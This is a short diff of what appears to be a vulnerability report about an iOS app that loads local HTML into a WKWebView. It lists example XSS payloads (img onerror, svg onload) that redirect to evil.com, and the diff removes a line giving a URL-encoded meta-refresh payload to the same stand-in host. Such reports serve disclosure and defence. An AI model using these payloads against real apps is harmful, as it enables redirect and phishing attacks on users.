@@ -21,8 +21,6 @@ Example payloads:
 - `<img src=x onerror="window.location='https://evil.com'">`
 - `<svg onload="window.location='https://evil.com'"></svg>`
 
-Ensure the payload is URL-encoded. For example, the tag `<meta...>` must be formatted as `%3Cmeta%20http-equiv=%22refresh%22%20content=%221;%20url=https://evil.com%22%3E`.
-
 Summary of steps leading to this vulnerability.
 
 1. The app creates a trusted local HTML file and loads it into a `WKWebView`.
